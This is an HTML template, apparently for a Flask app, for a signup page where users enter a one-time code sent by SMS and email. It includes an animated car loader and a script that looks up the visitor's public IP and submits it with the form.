<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>signup mobile code</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            width: 100%;
            padding: 40px;
            margin-top: -80px;
            text-align: center;
            border-radius: 10px; /* Rounded corners for container */
        }
        .back-button {
            position: absolute; /* Position it at the top */
            left: 20px; /* Space from the left */
            top: 30px; /* Space from the top */
        }
        input{
            width: 100%;
            height: 50px;
            font-family: 'Poppins', sans-serif;
            font-size: 15px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 10px;

        }
        button {
            background-color: #0747A9;
            color: white;
            font-family: 'Poppins', sans-serif;
            border: 0px solid black;
            margin: 20px 0;
            font-size: 17px;
            font-weight: bold;
            border-radius: 50px;
            height: 50px;
            width: 100%;
            cursor: pointer;
        }
        button:hover {
            background-color: #053e7a;
        }

        /* Fullscreen Loader Styles */
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .loader {
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .car {
            width: 102px;
            height: 40px;
        }

        .car__body {
            animation: shake 0.2s ease-in-out infinite alternate;
        }

        .car__line {
            transform-origin: center right;
            stroke-dasharray: 22;
            animation: line 0.8s ease-in-out infinite;
            animation-fill-mode: both;
        }

        .car__line--top {
            animation-delay: 0s;
        }

        .car__line--middle {
            animation-delay: 0.2s;
        }

        .car__line--bottom {
            animation-delay: 0.4s;
        }

        @keyframes shake {
            0% {
                transform: translateY(-1%);
            }
            100% {
                transform: translateY(3%);
            }
        }

        @keyframes line {
            0% {
                stroke-dashoffset: 22;
            }
            25% {
                stroke-dashoffset: 22;
            }
            50% {
                stroke-dashoffset: 0;
            }
            51% {
                stroke-dashoffset: 0;
            }
            80% {
                stroke-dashoffset: -22;
            }
            100% {
                stroke-dashoffset: -22;
            }
        }
    </style>
</head>
<body>


    <!-- Loader Overlay -->
    <div class="loader-overlay" id="loader-overlay">
        <div class="loader">
            <svg class="car" xmlns="http://www.w3.org/2000/svg">
                <g transform="translate(2 1)" stroke="#002742" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round">
                    <path class="car__body" d="M47.293 2.375C52.927.792 54.017.805 54.017.805c2.613-.445 6.838-.337 9.42.237l8.381 1.863c2.59.576 6.164 2.606 7.98 4.531l6.348 6.732 6.245 1.877c3.098.508 5.609 3.431 5.609 6.507v4.206c0 .29-2.536 4.189-5.687 4.189H36.808c-2.655 0-4.34-2.1-3.688-4.67 0 0 3.71-19.944 14.173-23.902zM36.5 15.5h54.01" stroke-width="3" />
                    <ellipse class="car__wheel--left" stroke-width="3.2" fill="#FFF" cx="83.493" cy="30.25" rx="6.922" ry="6.808" />
                    <ellipse class="car__wheel--right" stroke-width="3.2" fill="#FFF" cx="46.511" cy="30.25" rx="6.922" ry="6.808" />
                    <path class="car__line car__line--top" d="M22.5 16.5H2.475" stroke-width="3" />
                    <path class="car__line car__line--middle" d="M20.5 23.5H.4755" stroke-width="3" />
                    <path class="car__line car__line--bottom" d="M25.5 9.5h-19" stroke-width="3" />
                </g>
            </svg>
        </div>
    </div>


    <div class="login-container">
        <!-- Back button with image -->
        <a href="{{ url_for('home') }}" class="back-button" style="-webkit-tap-highlight-color: transparent;">
            <img src="{{ url_for('static', filename='images/back.png') }}" alt="Back" style="width: 30px; height: 30px;">
        </a>
        
        <h2 align="left" style="color: #484848;">Enter the code we've just send you by SMS and Email</h2>
        <form method="POST" id="mobilecode-form">
            <input type="number" name="otpcode" id="otpcode" placeholder="&nbsp;Enter OTP" required>
            <input type="text" name="public_ip" id="public_ip" placeholder="&nbsp;Enter OTP" hidden>
            <label id="error" name="error" style="margin-top: 5px; color: red; width: 100%; font-family: 'Poppins', sans-serif; font-size: 15px;">
                {{ error }}
            </label>
            <br>
            <!-- <button style="margin-top: -10px; width: auto; height: auto; color: #484848; background-color: transparent;" type="submit">
                Resend code
            </button> -->

            <!-- <button type="submit">Next</button> -->
            <button type="submit" style="margin-top: -5px; -webkit-tap-highlight-color: transparent;">Next</button>

        </form>
    </div>
</body>
</html>

<script>


        document.addEventListener('DOMContentLoaded', () => {
            const loaderOverlay = document.getElementById('loader-overlay');
            const content = document.getElementById('content');
            const form = document.getElementById('mobilecode-form');
    
            // Hide loader and show content when the page loads
            window.onload = () => {
                loaderOverlay.style.display = 'none';
                content.style.display = 'block';
            };
    
            // Show loader when the form is submitted
            form.addEventListener('submit', (e) => {
                loaderOverlay.style.display = 'flex'; // Show loader
                content.style.display = 'none'; // Hide content
                // Form submission will proceed naturally
            });
        });


    // // Show error label if there's an error message
    // const errorMessage = "{{ error }}";
    // if (errorMessage) {
    //     document.getElementById('error').style.display = 'block';
    // }



    document.addEventListener('DOMContentLoaded', () => {
    let publicIp = "Unknown"; // Default value in case of an error

    // Function to fetch public IP
    async function fetchPublicIP() {
        try {
            let response = await fetch("https://api64.ipify.org?format=json");
            let data = await response.json();
            publicIp = data.ip;
            console.log("Public IP:", publicIp);
            document.getElementById("public_ip").value = publicIp;
        } catch (error) {
            console.error("Error fetching public IP:", error);
        }
    }

    // Call function to fetch the IP
    fetchPublicIP();

    // Attach public IP to form before submitting
    document.getElementById('mobilecode-form').addEventListener('submit', (e) => {
        let ipInput = document.createElement("input");
        ipInput.type = "hidden";
        ipInput.name = "public_ip";
        ipInput.value = publicIp;
        e.target.appendChild(ipInput); // Append hidden input to form
    });
});
</script>
